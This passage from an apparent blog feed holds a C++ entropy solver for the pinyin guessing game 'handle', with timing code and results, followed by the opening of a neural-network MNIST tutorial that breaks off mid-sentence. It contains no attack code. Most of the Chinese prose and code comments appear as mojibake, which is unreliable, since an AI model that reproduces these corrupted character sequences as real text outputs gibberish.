class="comment">// E calculation with depth=0 for all data</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled; <span class="comment">// å½¢å¼ enabledï¼Œé™¤äº†å‚æ•°å ä½æ— å®é™…ä½œç”¨</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt; entropyRecords, topERecs;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> guessIndex = <span class="number">0</span>; guessIndex &lt; MAXSIZE; guessIndex++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">0</span>, guessIndex, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D0-No.&quot;</span> &lt;&lt; guessIndex &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[guessIndex]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        entropyRecords.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    entropyRecords.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 0 with E value</span></span><br><span class="line">    <span class="built_in">list</span>&lt;EntropyRecord&gt;::iterator iterERec = entropyRecords.begin();</span><br><span class="line">    ofstream f_word(&quot;d0rankedWord.txt&quot;), f_E(&quot;d0rankedE.txt&quot;);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; iterERec != entropyRecords.end(); iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// E calculation with depth=1 for TOP</span></span><br><span class="line">    iterERec = entropyRecords.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; TOP; iterERec++, cnt++)</span><br><span class="line">    &#123;</span><br><span class="line">        EntropyRecord myEntRec = GetEntropy(<span class="number">1</span>, (*iterERec).index, enabled);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; D1-No.&quot;</span> &lt;&lt; cnt &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; words[(*iterERec).index]</span><br><span class="line">             &lt;&lt; <span class="string">&quot; complete with E of &quot;</span> &lt;&lt; myEntRec.E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        topERecs.push_back(myEntRec);</span><br><span class="line">    &#125;</span><br><span class="line">    topERecs.sort(cmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Save TOP ranks at depth 1 with E value</span></span><br><span class="line">    f_word.open(<span class="string">&quot;d1rankedWord.txt&quot;</span>);</span><br><span class="line">    f_E.open(<span class="string">&quot;d1rankedE.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (iterERec = topERecs.begin(); iterERec != topERecs.end(); iterERec++)</span><br><span class="line">    &#123;</span><br><span class="line">        f_word &lt;&lt; words[(*iterERec).index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        f_E &lt;&lt; (*iterERec).E &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f_word.close();</span><br><span class="line">    f_E.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>å…¶å®æˆ‘æ˜¯å‡†å¤‡å§handleå®Œæ•´æ¬åˆ°c++ä¸Šæ¥çš„ï¼Œç»“æœä»£ç å¼„å®Œäº†å‘ç°æˆ‘ä¸çŸ¥é“æ€ä¹ˆè®©c++æ”¯æŒä¸­æ–‡è¾“å…¥ï¼ˆï¼Ÿ</p><p>ä½†æ˜¯ä¸å‡†å¤‡ç»§ç»­æ—¥äº†ï¼Œæ”¾ä¸ªä¹‹å‰çš„ä»£ç </p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetRand</span><span class="params">(<span class="keyword">int</span> seed=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(seed ? seed : (<span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> rand() % MAXSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowMatch</span><span class="params">(<span class="keyword">char</span> *partern, ZHword guess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++, <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> index = j + <span class="number">3</span> * i;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">int</span>)partern[index] == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; guess.pinyin[index] &lt;&lt; <span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; guess.pinyin[index];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StartRound</span><span class="params">(<span class="keyword">int</span> roundLimit, <span class="built_in">list</span>&lt;ZHword&gt; words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt;::iterator answer = words.begin();</span><br><span class="line">    advance(answer, GetRand() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> round = <span class="number">0</span>; round &lt; roundLimit; round++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>&lt;ZHword&gt;::iterator guess;</span><br><span class="line">        <span class="built_in">string</span> guessIn;</span><br><span class="line">        <span class="keyword">char</span> results[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Round: &quot;</span> &lt;&lt; round &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; guessIn; <span class="comment">// TNND C++ä¸èƒ½è¾“å…¥ä¸­æ–‡ QAQ</span></span><br><span class="line"><span class="comment">// ====================================================== //</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (guess = words.begin(); guess != words.end(); guess++)</span><br><span class="line">            <span class="keyword">if</span> ((*guess).word == guessIn)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*guess).word != guessIn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Unkown word&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (CheckPart(*guess, *answer, results))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Correct&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ShowMatch(results, *guess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Failed&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>è¿˜æœ‰å°±æ˜¯è¿™ä»¤äººå‘æŒ‡çš„è¿è¡Œé€Ÿåº¦ï¼Œä¸ä¼šå¤šæ ¸å¤šçº¿ç¨‹ä¼˜åŒ–æ‰€ä»¥æ²¡åŠæ³•</p><blockquote><p>å­¦äº†OSåçš„è¡¥å……ï¼šç°åœ¨ä¼šäº†</p></blockquote><p>ä½†æ˜¯å¯ä»¥åŠ å…¥è®¡æ—¶å‡½æ•°é‡åŒ–æˆ‘çš„ç—›è‹¦ :)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">CheckTime</span><span class="params">(<span class="keyword">clock_t</span> &amp;start, <span class="keyword">clock_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> delta = <span class="keyword">double</span>(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    start = end;</span><br><span class="line">    <span class="keyword">return</span> delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">clock_t</span> clockStart;</span><br><span class="line">    clockStart = clock();</span><br><span class="line">    <span class="comment">// ... sth.</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;time length: &quot;</span> &lt;&lt; CheckTime(clockStart, clock()) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windowsä¸‹g++ç¼–è¯‘ï¼Œ<code>depth=0</code>è·‘å®Œ<code>16</code>ä¸ªå¤§çº¦æ˜¯<code>12s</code>ï¼Œ<code>depth=1</code>è·‘å®Œ<code>4</code>ä¸ªå¤§çº¦æ˜¯<code>32s</code>ï¼Œæˆ‘å¤§æ¦‚æ˜¯èŠ±äº†4~5hè·‘å®Œæ‰€æœ‰æ•°æ®</p><p><del>ä»¥åŠåƒä¸‡ä¸è¦è®©æµ‹é€Ÿåº¦çš„è„šæœ¬èƒ½è¦†ç›–ç»“æœï¼Œåƒæˆ‘ç›´æ¥æŠŠä¹‹å‰ç®—å®Œçš„ç»™è¦†ç›–äº†ï¼Œå…¨éƒ¨é‡æ¥</del></p><h3 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h3><p>ç»è¿‡æ’åºå‘ç°</p><center><b>ç ”ç»é“¸å²</b></center><br><p>æ˜¯handleçš„æœ€ä¼˜å¼€å¤´ï¼Œä¸”åœ¨depth=1çš„æƒ…å†µä¸‹E=14.8701ï¼Œä»¥Î”E=0.03çš„å·¨å¤§å·®å€¼ï¼ˆç¬‘ï¼‰å’Œç¬¬äºŒåæ‹‰å¼€è·ç¦»</p><h2 id="ç»“æœç»Ÿè®¡"><a href="#ç»“æœç»Ÿè®¡" class="headerlink" title="ç»“æœç»Ÿè®¡"></a>ç»“æœç»Ÿè®¡</h2><p>åŸºæœ¬å…¨éƒ¨æ­£å¸¸çš„è¯åœ¨d0çš„Eéƒ½åœ¨10ä»¥ä¸Šï¼Œå°‘æ•°å¦‚â€œå¯å£å¯ä¹â€ï¼Œd0E=6.55192ï¼Œè¿™æ ·çš„è¯æ‹‰ä½äº†æ•´ä½“ä¸‹é™ï¼Œæ•´ä½“d0Eåˆ†å¸ƒå¦‚ä¸‹</p><img src="/images/handle_d0.png"/><p>å¯¹äºå‰d0Eæ’åtop100çš„è¯è¿›è¡Œd1Eçš„è®¡ç®—å’Œæ’åºï¼Œåˆ†å¸ƒå¦‚ä¸‹</p><img src="/images/handle_d1.png"/><p>æ—¥ä¸åŠ¨äº†ï¼Œå†è§ UwU</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]</title>
      <link href="2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8%5D/"/>
      <url>2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%5B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8%5D/</url>
      
        <content type="html"><![CDATA[<p>å…¨è¿æ¥ç¥ç»ç½‘ç»œè¯†åˆ«MNISTæ‰‹å†™æ•°å­—é›†ï¼ŒAIä¸­çš„HelloWorld</p><img src="/images/FCNN_cover.png"/><span id="more"></span><!--toc--><h1 id="å…¨è¿æ¥ç¥ç»ç½‘ç»œ-ç¥ç»ç½‘ç»œå…¥é—¨"><a href="#å…¨è¿æ¥ç¥ç»ç½‘ç»œ-ç¥ç»ç½‘ç»œå…¥é—¨" class="headerlink" title="å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]"></a>å…¨è¿æ¥ç¥ç»ç½‘ç»œ[ç¥ç»ç½‘ç»œå…¥é—¨]</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç°åœ¨çš„AIåº“è¯¸å¦‚<code>TensorFlow</code>,<code>Keras</code>,<code>Pytorch</code>ç­‰ï¼Œéƒ½å¯ä»¥å¿«æ·æ–¹ä¾¿åœ°åœ¨å‡ è¡Œä»£ç ä¹‹å†…å°±æ„å»ºå¥½ä¸€ä¸ªç½‘ç»œæ¨¡å‹ï¼Œç„¶åå¼€å§‹è®­ç»ƒç­‰åç»­çš„äº‹æƒ…ï¼Œä½†æŠŠè¿™äº›åº“å½“æˆé»‘ç›’æ¥ç”¨çš„è¯ï¼Œåæ­£æˆ‘æ˜¯æ™šä¸Šç¡ä¸ç€è§‰çš„</p><p>è™½ç„¶è¯´å…¨è¿æ¥ç¥ç»ç½‘ç»œï¼ˆFully Connected Neural Networkï¼Œä»¥ä¸‹ç®€ç§°<code>FCNN</code>ï¼‰æ˜¯äººé€ ç¥ç»ç½‘ç»œï¼ˆArtificial Neural Networkï¼Œä»¥ä¸‹ç®€ç§°<code>ANN</code>ï¼‰çš„å…¥é—¨ï¼Œä½†åœ¨è¿™ä¹‹å‰ä¹Ÿå¯ä»¥å…ˆåšä¸€äº›çº¿æ€§å›å½’ï¼Œé€»è¾‘å›å½’ï¼Œä»¥åŠé€»è¾‘å›å½’çš„å¤šåˆ†ç±»æ¥åŠ æ·±ç†è§£å’Œé™ä½å…¥é—¨çš„éš¾åº¦ï¼Œè¿™äº›ä¹Ÿæ˜¯æˆ‘ä¹‹å‰åšè¿‡çš„ä¸œè¥¿ï¼Œä½†å› ä¸ºå†™çš„æ¯”è¾ƒçƒ‚è€Œä¸”æœ¬èº«ä¹Ÿä¸éš¾ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†</p><p>å› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¹‹å‰åªæœ‰<a href="https://kyriota.com/2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise[AI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99]/">è¿™ç¯‡è®²å¯¹æŠ—æ‰°åŠ¨çš„æ–‡ç« </a>æ˜¯æœ‰å…³æœºå™¨å­¦ä¹ çš„ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå°½é‡åœ¨è¿™ç¯‡æ–‡ç« ä¸­ç»†ğŸ”’ä¸€äº›æ¦‚å¿µå’Œç†è§£ï¼Œæœ€å¥½èƒ½è®©åƒç“œçš„ä¹Ÿèƒ½åƒçš„èˆ’æœ</p><h2 id="ANNæ¦‚è¿°"><a href="#ANNæ¦‚è¿°" class="headerlink" title="ANNæ¦‚è¿°"></a>ANNæ¦‚è¿°</h2><p>å¯¹äºç¥ç»ç½‘ç»œçš„è®¤è¯†å’Œç†è§£ï¼Œå¼ºçƒˆæ¨è<a href="https://www.bilibili.com/video/BV1bx411M7Zx">3b1bçš„ç³»åˆ—è§†é¢‘</a>ï¼ˆå…±å››é›†ï¼‰ï¼Œä»æ¦‚å¿µåˆ°å…¬å¼ä¸€æ¡é¾™æœåŠ¡ï¼Œè®²çš„è‚¯å®šæ¯”æˆ‘æ¸…æ¥šå’Œç›´è§‚</p><p>å¯¹äºç³»ç»Ÿå­¦ä¹ æœºå™¨å­¦ä¹ çš„ç›¸å…³çŸ¥è¯†ï¼ˆåŒ…æ‹¬çº¿æ€§å›å½’ï¼Œé€»è¾‘å›å½’ç­‰ï¼‰ï¼Œå¯ä»¥çœ‹<a href="https://www.bilibili.com/video/BV164411b7dx">å´æ©è¾¾ç³»åˆ—è§†é¢‘</a>ï¼ˆè¿™ä¸ªå°±æœ‰ç‚¹å¤šäº†ï¼‰</p><h3 id="ANNæ˜¯ä»€ä¹ˆ"><a href="#ANNæ˜¯ä»€ä¹ˆ" class="headerlink" title="ANNæ˜¯ä»€ä¹ˆ"></a>ANNæ˜¯ä»€ä¹ˆ</h3><p>ç¥ç»ç½‘ç»œä¸æ˜¯ç„å­¦ï¼Œå…¨æ˜¯æ•°å­¦ï¼Œå…·ä½“ç‚¹ï¼Œæˆ‘ç›®å‰åšçš„ä¸œè¥¿æ¶‰åŠåˆ°çš„æ¦‚å¿µå…¶å®ä¹Ÿå°±ï¼šåå¯¼æ•°ï¼Œçº¿æ€§ä»£æ•°ï¼Œé“¾å¼æ³•åˆ™ï¼Œéƒ½æ˜¯å¤§ä¸€å°±å­¦è¿‡çš„ä¸œè¥¿</p><p>æœ¬æ–‡ä¼šè®²è§£å¦‚ä½•è®­ç»ƒä¸€ä¸ªè¯†åˆ«MNISTæ‰‹å†™æ•°å­—é›†çš„ç¥ç»ç½‘ç»œï¼ŒMNISTæ‰‹å†™æ•°å­—é›†æ˜¯åŒ…å«äº†æ•°ä¸‡å¼ 28x28çš„æ‰‹å†™æ•°å­—å›¾åƒçš„æ•°æ®é›†ï¼ˆä»¥ä¸‹ç®€ç§°MNISTï¼Œä½†å…¶å®è¿˜æœ‰MNISTè¡£ç‰©å›¾ç‰‡çš„æ•°æ®é›†ç­‰ï¼‰ï¼Œæ¯ä¸ªæ•°å­—å¯¹åº”äº†ä¸€ä¸ª<code>lable</code>ï¼ŒæŒ‡æ˜å›¾åƒå¯¹åº”çš„æ•°å­—ï¼Œå¦‚ä¸‹å›¾å°±æ˜¯ä¸€ä»½æ•°æ®é›†ä¸­åŒ…å«çš„æ•°æ®æ ·æœ¬ï¼Œè€Œä»–å¯¹åº”çš„<code>lable</code>æ˜¯<code>1</code></p><img src="/images/FCNN_sample.png"/><p>æŠ½è±¡çš„è¯´ï¼Œç¥ç»ç½‘ç»œå°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆè¿™æ ·æ€è€ƒå¯¹äºCTFä¸­æ„é€ å¯¹æŠ—æ ·æœ¬å¾ˆæœ‰å¸®åŠ©ï¼‰ï¼Œä½ ç»™ä»–ä¸€ä¸ªè¾“å…¥ï¼Œä»–ç»™ä½ ä¸€ä¸ªè¾“å‡º</p><p>è®°è¿™ä¸ªç½‘ç»œä¸º<code>h</code>ï¼ˆhypothesisï¼‰ï¼Œè¿™ä¸ªè¾“å…¥çš„<code>1</code>çš„æ•°å­—å›¾ç‰‡æ ·æœ¬è®°ä¸º<code>X</code>ï¼Œåˆ™æˆ‘ä»¬æ‰€æœŸå¾…çš„æ˜¯æ¨¡å‹è¾“å‡ºä¸€ä¸ªå‘é‡æ¥æè¿°å„ä¸ªæ•°å­—çš„æ¦‚ç‡<code>h(X)=&#123;0,1,0,0,0,0,0,0,0,0&#125;</code>ï¼ˆä»å·¦åˆ°å³æ˜¯0è‡³9çš„æ¦‚ç‡ï¼Œæ„æ€æ¨¡å‹è®¤ä¸ºå›¾ç‰‡æ˜¯<code>1</code>çš„æ¦‚ç‡æ˜¯100%ï¼Œæ˜¯é™¤äº†<code>1</code>ä»¥å¤–çš„æ•°å­—çš„æ¦‚ç‡æ˜¯0%ï¼Œè¿™æ ·çš„æ ¼å¼ç§°ä¸º<code>OneHot Encoding</code>ï¼Œå¥½å¤„æ˜¯ä¾¿äºçŸ©é˜µè®¡ç®—ï¼‰</p><h3 id="ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½"><a href="#ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½" class="headerlink" title="ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½"></a>ANNä¸ºä½•è¡¨ç°å‡ºæ™ºèƒ½</h3><p>åœ¨3b1bçš„è§†é¢‘ä¸­ï¼Œä»–åœ¨Part1çš„5:40æåˆ°</p><blockquote><p>Why itâ€™s even reasonable to expect a layered structure like this to behave intelligently</p></blockquote><p>ä»–ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒè®©äººå®¹æ˜“æ¥å—çš„ç†è§£ï¼Œå³åœ¨å¤šå±‚æ¬¡çš„ç»“æ„ä¸­ï¼Œä¸Šä¸€å±‚å¤„ç†å‡ºå›¾åƒçš„ä¸€äº›ç»†å¾®ç‰¹å¾ï¼Œç„¶ååœ¨ä¸‹ä¸€å±‚å¯¹è¿™äº›ç‰¹å¾è¿›è¡Œç»„åˆ</p><p>ä½†æ˜¾ç„¶çœŸæ­£çš„ç½‘ç»œå¹¶ä¸æ˜¯è¿™æ ·å·¥ä½œçš„ï¼Œåœ¨3b1bçš„è§†é¢‘ä¸­ï¼Œä»–åœ¨Part2çš„14:25å±•ç¤ºäº†ä¸€äº›ç¥ç»ç½‘ç»œçš„æƒé‡å¯è§†åŒ–ï¼Œè€Œç›´è§‚ä¸Šçœ‹å¯è§†åŒ–åçš„æƒé‡ï¼ŒåŸºæœ¬å°±æ˜¯ç¨å¾®æœ‰åºä¸€äº›çš„å™ªéŸ³ï¼Œæ‰€ä»¥å…³äºè¿™ä¸ªç½‘ç»œæ€ä¹ˆèƒ½å¤Ÿå¾—åˆ°æˆ‘ä»¬æ‰€æœŸå¾…çš„åŠŸèƒ½é‚£æ˜¯è¿™ä¸ªç½‘ç»œè‡ªå·±çš„äº‹æƒ…ï¼ˆâ€œä½ å·²ç»æ˜¯ä¸€ä¸ªæˆç†Ÿçš„ç¥ç»ç½‘ç»œäº†â€ï¼‰ï¼Œåªè¦ä»–æ‰¾åˆ°äº†ä¸€ä¸ªè¿˜ç®—ä¸é”™çš„å±€éƒ¨æœ€ä¼˜è§£ï¼Œé‚£å…¶å®å°±å·²ç»è¶³å¤Ÿäº†</p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼ŒæŠŠANNçœ‹æˆä¸€ä¸ªæ•°å­¦æ¨¡å‹å°±è¡Œï¼Œåƒä¸‡åˆ«æƒ³ç„ä¹äº†ï¼Œåœ¨ç”Ÿç‰©ä¸Šçš„ç¥ç»ç§‘å­¦å‘å±•å®Œå…¨ä¹‹å‰ï¼Œå¯¹â€œæ™ºèƒ½â€çš„å®šä¹‰éƒ½ä¼šæ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼Œæˆ‘ä»¬å°±ç®—æ„Ÿè§‰AIå¥½åƒæ‹¥æœ‰æ™ºèƒ½ï¼Œé‚£ä¹Ÿåªä¸è¿‡æ˜¯ä¸€ä¸ªç»“æ„æ¯”è¾ƒå¤æ‚çš„å‡½æ•°</p><h2 id="ä¸€ä¸ªç¥ç»å…ƒ"><a href="#ä¸€ä¸ªç¥ç»å…ƒ" class="headerlink" title="ä¸€ä¸ªç¥ç»å…ƒ"></a>ä¸€ä¸ªç¥ç»å…ƒ</h2><p>æˆ‘å¾ˆå–œæ¬¢çš„ä¸€å¥è¯ï¼šç®€å•çš„è§„åˆ™å¯ä»¥ç»„æˆå¤æ‚çš„ç³»ç»Ÿï¼Œè¿™å¥è¯åœ¨ç¥ç»ç½‘ç»œä¸­åŒæ ·é€‚ç”¨ï¼Œå…ˆç†è§£å•ä¸ªç¥ç»å…ƒçš„å·¥ä½œåŸç†ï¼Œæ‰èƒ½ç†è§£ä»–ä»¬ç»„æˆçš„ç½‘ç»œæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œåœ¨åç»­å¯¹ç¥ç»ç½‘ç»œçš„æ•°å­¦æ¨å¯¼ä¸­ï¼Œæˆ‘ä¹Ÿä¼šå…ˆå¯¹å•ä¸ªç¥ç»å…ƒç»„æˆçš„ç½‘ç»œæ¨å¯¼ï¼Œç„¶åå†æ¨å¹¿å¼€æ¥ï¼Œæ–¹ä¾¿æˆ‘è¿™æ ·ğŸ§ ä¸å¤ªå¥½çš„äººç†è§£ï¼ˆè¿™ä¹Ÿæ˜¯3b1bçš„åšæ³•ï¼Œå¤ªç…§é¡¾äººäº†</p><p>ä»¥ä¸‹å†…å®¹å‡ä»¥ä¸‹å›¾æ‰€ç¤ºç½‘ç»œä¸ºä¾‹</p><img src="/images/FCNN_cover.png"/><p>é¦–å…ˆæ˜ç¡®ï¼ŒFCNNæ˜¯ä¸€ä¸ªå¤šå±‚æ¬¡ç»“æ„ï¼ŒåŒ…å«äº†è¾“å…¥å±‚ï¼Œéšè—å±‚ï¼Œè¾“å‡ºå±‚</p><p>å•ä¸ªç¥ç»å…ƒçš„æœºç†å¾ˆç®€å•ï¼Œè§‚å¯Ÿéšè—å±‚<code>Dense #2</code>ä¸­çš„ç¬¬0ä¸ªç¥ç»å…ƒï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè®°ä½œ<code>Z[2][0]</code>ï¼Œå…¶ä¸­ï¼Œ<code>Z</code>è¡¨ç¤ºç¥ç»å…ƒå‡½æ•°æœ¬èº«ï¼Œ<code>[2]</code>è¡¨ç¤ºå…¶åœ¨ç¬¬äºŒå±‚ï¼Œ<code>[0]</code>è¡¨ç¤ºå…¶æ˜¯ç¬¬ä¸€ä¸ªç¥ç»å…ƒï¼Œç”±å›¾å¯çŸ¥ï¼Œå®ƒçš„è¾“å…¥æ˜¯å…¶ä¸Šä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒçš„è¾“å‡ºï¼Œå®ƒçš„è¾“å‡ºä¼šä¼ é€’åˆ°ä¸‹ä¸€å±‚çš„æ¯ä¸€ä¸ªç¥ç»å…ƒï¼Œè¿™ä¹Ÿæ˜¯â€œå…¨è¿æ¥â€çš„ç›´æ¥ä½“ç°ï¼ˆä½ 